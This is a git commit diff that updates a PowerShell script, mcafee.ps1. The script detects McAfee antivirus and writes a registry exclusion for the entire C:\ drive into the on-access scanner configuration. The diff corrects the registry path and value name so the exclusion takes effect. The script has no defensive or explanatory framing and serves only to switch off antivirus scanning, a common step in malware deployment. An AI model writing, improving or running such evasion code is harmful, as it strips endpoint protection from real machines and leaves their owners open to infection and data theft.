e63e152600f5598738717351813da8f3f873ae94
LapinGaloca <fmbkrama@gmail.com>
2024-10-30 16:12:09 -0500

    Add files via upload

--- mcafee.ps1
+++ mcafee.ps1
@@ -2,13 +2,16 @@ $exclusionPath = "C:\"
 $registryPath = ""
 
 if ($env:PROCESSOR_ARCHITECTURE -eq "AMD64") {
-    $registryPath = "HKLM:\SOFTWARE\Wow6432Node\McAfee\DesktopProtection"
+    $registryPath = "HKLM:\SOFTWARE\Wow6432Node\McAfee\SystemCore\VSCore\On Access Scanner\McShield\Configuration\Default"
 } else {
-    $registryPath = "HKLM:\SOFTWARE\McAfee\DesktopProtection"
+    $registryPath = "HKLM:\SOFTWARE\McAfee\SystemCore\VSCore\On Access Scanner\McShield\Configuration\Default"
 }
 
 if (Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct | Where-Object { $_.displayName -like "*McAfee*" }) {
     if (Test-Path $registryPath) {
-        Set-ItemProperty -Path $registryPath -Name "ExcludePath" -Value $exclusionPath
+        if (Get-ItemProperty -Path $registryPath -Name "ExcludedItem_1" -ErrorAction SilentlyContinue) {
+            Remove-ItemProperty -Path $registryPath -Name "ExcludedItem_1" -ErrorAction SilentlyContinue
+        }
+        Set-ItemProperty -Path $registryPath -Name "ExcludedItem_1" -Value $exclusionPath
     }
 }
